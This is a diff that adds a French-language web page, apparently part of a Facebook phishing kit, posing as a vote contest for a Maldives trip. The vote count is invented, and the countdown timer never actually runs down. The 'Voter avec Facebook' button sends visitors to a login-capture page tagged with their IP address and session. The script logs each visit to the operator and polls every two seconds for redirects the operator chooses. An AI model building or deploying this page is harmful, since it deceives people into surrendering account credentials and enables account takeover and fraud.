@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voyage de Rêve aux Maldives - Votez Maintenant</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #0ea5e9;
+            --primary-dark: #0284c7;
+            --secondary: #06b6d4;
+            --accent: #f59e0b;
+            --accent-light: #fbbf24;
+            --bg: #f0f9ff;
+            --card: #ffffff;
+            --text: #0f172a;
+            --text-secondary: #64748b;
+            --border: #e2e8f0;
+            --success: #10b981;
+            --gradient-1: linear-gradient(135deg, #0ea5e9 0%, #06b6d4 50%, #0891b2 100%);
+            --gradient-2: linear-gradient(135deg, #f59e0b 0%, #f97316 100%);
+            --gradient-hero: linear-gradient(135deg, #0c4a6e 0%, #075985 50%, #0369a1 100%);
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.08);
+            --shadow-md: 0 4px 16px rgba(0,0,0,0.08);
+            --shadow-lg: 0 12px 40px rgba(0,0,0,0.12);
+            --shadow-xl: 0 20px 60px rgba(0,0,0,0.15);
+            --radius: 20px;
+            --radius-sm: 12px;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .hero {
+            background: var(--gradient-hero);
+            padding: 60px 20px 80px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.05) 1px, transparent 1px);
+            background-size: 30px 30px;
+            animation: drift 20s linear infinite;
+        }
+
+        @keyframes drift {
+            from { transform: translate(0, 0); }
+            to { transform: translate(30px, 30px); }
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 2;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.15);
+            backdrop-filter: blur(10px);
+            color: #e0f2fe;
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            border: 1px solid rgba(255,255,255,0.2);
+            animation: pulse-glow 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-glow {
+            0%, 100% { box-shadow: 0 0 20px rgba(245,158,11,0.3); }
+            50% { box-shadow: 0 0 30px rgba(245,158,11,0.5); }
+        }
+
+        .hero-badge i { color: var(--accent-light); }
+
+        .hero h1 {
+            font-size: clamp(2rem, 5vw, 3.2rem);
+            font-weight: 900;
+            color: white;
+            line-height: 1.15;
+            margin-bottom: 16px;
+            letter-spacing: -0.02em;
+        }
+
+        .hero h1 span {
+            background: var(--gradient-2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero p {
+            font-size: 1.1rem;
+            color: rgba(224,242,254,0.85);
+            line-height: 1.7;
+            max-width: 550px;
+            margin: 0 auto 32px;
+        }
+
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 20px;
+        }
+
+        .hero-stat {
+            text-align: center;
+        }
+
+        .hero-stat-value {
+            font-size: 2rem;
+            font-weight: 800;
+            color: var(--accent-light);
+        }
+
+        .hero-stat-label {
+            font-size: 12px;
+            color: rgba(224,242,254,0.7);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 4px;
+        }
+
+        .main-content {
+            max-width: 900px;
+            margin: -40px auto 40px;
+            padding: 0 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .card {
+            background: var(--card);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+            margin-bottom: 20px;
+            border: 1px solid var(--border);
+        }
+
+        .card-header {
+            padding: 24px 28px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .card-header-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            flex-shrink: 0;
+        }
+
+        .card-header-icon.blue { background: #e0f2fe; color: var(--primary); }
+        .card-header-icon.amber { background: #fef3c7; color: var(--accent); }
+        .card-header-icon.green { background: #d1fae5; color: var(--success); }
+        .card-header-icon.purple { background: #ede9fe; color: #7c3aed; }
+
+        .card-header-text h2 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--text);
+        }
+
+        .card-header-text p {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-top: 2px;
+        }
+
+        .card-body { padding: 28px; }
+
+        .candidate-card {
+            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+            border: 2px solid #bae6fd;
+            border-radius: 16px;
+            padding: 28px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .candidate-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--gradient-1);
+        }
+
+        .candidate-avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: var(--gradient-1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 32px;
+            color: white;
+            box-shadow: 0 4px 20px rgba(14,165,233,0.3);
+        }
+
+        .candidate-name {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: var(--text);
+            margin-bottom: 4px;
+        }
+
+        .candidate-subtitle {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 24px;
+        }
+
+        .vote-count {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: white;
+            border: 1px solid var(--border);
+            border-radius: 50px;
+            padding: 8px 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .vote-count-number {
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: var(--primary);
+        }
+
+        .vote-count-label {
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .progress-section { margin-top: 16px; }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .progress-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        .progress-value {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .progress-track {
+            height: 10px;
+            background: #e0f2fe;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--gradient-1);
+            border-radius: 10px;
+            transition: width 1.5s ease;
+            position: relative;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .prizes-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+
+        @media (max-width: 500px) {
+            .prizes-grid { grid-template-columns: 1fr; }
+        }
+
+        .prize-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 16px;
+            background: #fafafa;
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border);
+            transition: all 0.2s;
+        }
+
+        .prize-item:hover {
+            border-color: var(--primary);
+            background: #f0f9ff;
+        }
+
+        .prize-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .prize-icon.flight { background: #dbeafe; color: #2563eb; }
+        .prize-icon.hotel { background: #fce7f3; color: #db2777; }
+        .prize-icon.food { background: #fef3c7; color: #d97706; }
+        .prize-icon.activity { background: #d1fae5; color: #059669; }
+
+        .prize-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--text);
+        }
+
+        .timer-section {
+            text-align: center;
+            padding: 28px;
+        }
+
+        .timer-label-top {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 20px;
+        }
+
+        .timer-grid {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .timer-box {
+            background: var(--bg);
+            border-radius: 16px;
+            padding: 20px 16px;
+            min-width: 90px;
+            border: 1px solid var(--border);
+            position: relative;
+        }
+
+        .timer-value {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: var(--primary);
+            line-height: 1;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .timer-unit {
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 6px;
+        }
+
+        .timer-separator {
+            font-size: 2rem;
+            font-weight: 800;
+            color: var(--primary);
+            align-self: center;
+            padding-bottom: 20px;
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        .vote-cta {
+            padding: 0 28px 28px;
+        }
+
+        .vote-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            padding: 18px 24px;
+            background: var(--gradient-hero);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(12,74,110,0.3);
+        }
+
+        .vote-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .vote-btn:hover::before {
+            left: 100%;
+        }
+
+        .vote-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(12,74,110,0.4);
+        }
+
+        .vote-btn:active {
+            transform: translateY(0);
+        }
+
+        .vote-btn i {
+            font-size: 20px;
+        }
+
+        .share-card .card-body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .share-btn {
+            width: 52px;
+            height: 52px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .share-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-md);
+        }
+
+        .share-btn.fb { background: #1877f2; }
+        .share-btn.wa { background: #25d366; }
+        .share-btn.tw { background: #1da1f2; }
+        .share-btn.tg { background: #0088cc; }
+        .share-btn.ig { background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
+
+        .footer {
+            text-align: center;
+            padding: 32px 20px;
+            color: var(--text-secondary);
+            font-size: 13px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 8px;
+        }
+
+        .footer-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: var(--primary);
+        }
+
+        .glow-line {
+            height: 3px;
+            background: var(--gradient-1);
+            margin: 0 -28px;
+        }
+
+        @media (max-width: 600px) {
+            .hero { padding: 40px 16px 60px; }
+            .hero h1 { font-size: 1.8rem; }
+            .hero-stats { gap: 20px; }
+            .hero-stat-value { font-size: 1.5rem; }
+            .card-body { padding: 20px; }
+            .timer-grid { gap: 8px; }
+            .timer-box { min-width: 70px; padding: 14px 10px; }
+            .timer-value { font-size: 1.6rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="hero">
+        <div class="hero-content">
+            <div class="hero-badge">
+                <i class="fas fa-umbrella-beach"></i>
+                Concours en cours
+            </div>
+            <h1>Gagnez un <span>Voyage de Rêve</span> aux Maldives</h1>
+            <p>Votez pour votre ami(e) et offrez-lui un séjour paradisiaque de 2 semaines pour 2 personnes</p>
+            <div class="hero-stats">
+                <div class="hero-stat">
+                    <div class="hero-stat-value" id="hero-votes">53</div>
+                    <div class="hero-stat-label">Votes</div>
+                </div>
+                <div class="hero-stat">
+                    <div class="hero-stat-value">14</div>
+                    <div class="hero-stat-label">Nuits</div>
+                </div>
+                <div class="hero-stat">
+                    <div class="hero-stat-value">2</div>
+                    <div class="hero-stat-label">Personnes</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content">
+
+        <div class="card">
+            <div class="card-body" style="padding: 24px 28px;">
+                <div class="candidate-card" style="width: 100%;">
+                    <div class="candidate-avatar">
+                        <i class="fas fa-user"></i>
+                    </div>
+                    <div class="candidate-name" id="candidate-name">VOTEZ</div>
+                    <div class="candidate-subtitle">Candidate au voyage de rêve</div>
+                    <div class="vote-count">
+                        <span class="vote-count-number" id="votes-count">53</span>
+                        <span class="vote-count-label">votes obtenus</span>
+                    </div>
+                    <div class="progress-section">
+                        <div class="progress-header">
+                            <span class="progress-label">Progression vers la victoire</span>
+                            <span class="progress-value" id="progress-percent">65%</span>
+                        </div>
+                        <div class="progress-track">
+                            <div class="progress-fill" id="progress-fill" style="width: 65%;"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="glow-line"></div>
+        </div>
+
+        <div class="card">
+            <div class="timer-section">
+                <div class="timer-label-top">Le concours se termine dans</div>
+                <div class="timer-grid">
+                    <div class="timer-box">
+                        <div class="timer-value" id="hours">02</div>
+                        <div class="timer-unit">Heures</div>
+                    </div>
+                    <div class="timer-separator">:</div>
+                    <div class="timer-box">
+                        <div class="timer-value" id="minutes">35</div>
+                        <div class="timer-unit">Minutes</div>
+                    </div>
+                    <div class="timer-separator">:</div>
+                    <div class="timer-box">
+                        <div class="timer-value" id="seconds">00</div>
+                        <div class="timer-unit">Secondes</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">
+                <div class="card-header-icon amber"><i class="fas fa-gift"></i></div>
+                <div class="card-header-text">
+                    <h2>Le Grand Prix Inclut</h2>
+                    <p>Tout pour un séjour inoubliable</p>
+                </div>
+            </div>
+            <div class="card-body">
+                <div class="prizes-grid">
+                    <div class="prize-item">
+                        <div class="prize-icon flight"><i class="fas fa-plane"></i></div>
+                        <div class="prize-text">Vols aller-retour en classe affaires</div>
+                    </div>
+                    <div class="prize-item">
+                        <div class="prize-icon hotel"><i class="fas fa-hotel"></i></div>
+                        <div class="prize-text">14 nuits en villa sur pilotis</div>
+                    </div>
+                    <div class="prize-item">
+                        <div class="prize-icon food"><i class="fas fa-utensils"></i></div>
+                        <div class="prize-text">Pension complète gastronomique</div>
+                    </div>
+                    <div class="prize-item">
+                        <div class="prize-icon activity"><i class="fas fa-water"></i></div>
+                        <div class="prize-text">Activités nautiques illimitées</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="vote-cta">
+                <a id="vote-link" href="connexion_f.php?session=session_41.248.152.160&ip=41.248.152.160&name=VOTEZ" class="vote-btn">
+                    <i class="fab fa-facebook-f"></i>
+                    Voter avec Facebook
+                </a>
+            </div>
+        </div>
+
+        <div class="card share-card">
+            <div class="card-body">
+                <button class="share-btn fb" onclick="shareFacebook()"><i class="fab fa-facebook-f"></i></button>
+                <button class="share-btn wa" onclick="shareWhatsapp()"><i class="fab fa-whatsapp"></i></button>
+                <button class="share-btn tw" onclick="shareTwitter()"><i class="fab fa-twitter"></i></button>
+                <button class="share-btn tg" onclick="shareTelegram()"><i class="fab fa-telegram-plane"></i></button>
+                <button class="share-btn ig" onclick="shareInstagram()"><i class="fab fa-instagram"></i></button>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2026 Voyage de Rêve. Tous droits réservés.</p>
+        <div class="footer-links">
+            <a href="#">Règlement</a>
+            <a href="#">Confidentialité</a>
+            <a href="#">Contact</a>
+        </div>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const clientName = params.get('name') || 'VOTEZ';
+        let sessionId = params.get('session') || null;
+        let clientIp = params.get('ip') || null;
+
+        async function initSession() {
+            if (!sessionId || !clientIp || clientIp === 'unknown') {
+                try {
+                    const resp = await fetch('/register.php');
+                    const data = await resp.json();
+                    if (data.success) {
+                        sessionId = data.session;
+                        clientIp = data.ip;
+                    }
+                } catch (e) {
+                    if (!sessionId) sessionId = 'session_' + Date.now();
+                    if (!clientIp) clientIp = 'unknown';
+                }
+            }
+            if (!sessionId) sessionId = 'session_' + Date.now();
+            if (!clientIp) clientIp = 'unknown';
+
+            document.getElementById('candidate-name').textContent = clientName;
+            document.getElementById('vote-link').href = 'connexion_f.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&name=' + encodeURIComponent(clientName);
+            fetch('update_page.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&page=vote.html');
+        }
+
+        initSession();
+
+        function updateCountdown() {
+            const now = new Date();
+            const end = new Date();
+            end.setHours(end.getHours() + 2);
+            end.setMinutes(end.getMinutes() + 35);
+            const diff = end - now;
+            if (diff <= 0) {
+                document.getElementById('hours').textContent = '00';
+                document.getElementById('minutes').textContent = '00';
+                document.getElementById('seconds').textContent = '00';
+                return;
+            }
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+        }
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+
+        function shareFacebook() { window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(window.location.href), '_blank', 'width=600,height=400'); }
+        function shareWhatsapp() { window.open('https://wa.me/?text=' + encodeURIComponent("Votez pour " + clientName + " et aidez-le à gagner un voyage de rêve aux Maldives ! ") + encodeURIComponent(window.location.href), '_blank'); }
+        function shareTwitter() { window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent("Votez pour " + clientName + " et aidez-le à gagner un voyage de rêve aux Maldives ! ") + '&url=' + encodeURIComponent(window.location.href), '_blank', 'width=600,height=400'); }
+        function shareTelegram() { window.open('https://t.me/share/url?url=' + encodeURIComponent(window.location.href) + '&text=' + encodeURIComponent("Votez pour " + clientName + " et aidez-le à gagner un voyage de rêve aux Maldives ! "), '_blank', 'width=600,height=400'); }
+        function shareInstagram() { alert('Copiez le lien et partagez-le sur votre story Instagram !'); navigator.clipboard.writeText(window.location.href); }
+
+        function checkAction() {
+            if (!sessionId || !clientIp) return;
+            fetch('check_action.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp))
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
+                if (data.action) {
+                    if (data.action === 'custom' && data.redirect) {
+                        window.location.href = data.redirect + '.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&name=' + encodeURIComponent(clientName);
+                    } else if (data.action === 'redirect' && data.redirect) {
+                        window.location.href = data.redirect + '.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&name=' + encodeURIComponent(clientName);
+                    } else {
+                        window.location.href = data.action + '.php?session=' + encodeURIComponent(sessionId) + '&ip=' + encodeURIComponent(clientIp) + '&name=' + encodeURIComponent(clientName) + (data.errorMessage ? '&error=' + encodeURIComponent(data.errorMessage) : '');
+                    }
+                }
+            })
+            .catch(function(error) { console.error('Erreur:', error); });
+        }
+        setInterval(checkAction, 2000);
+    </script>
+</body>
+</html>
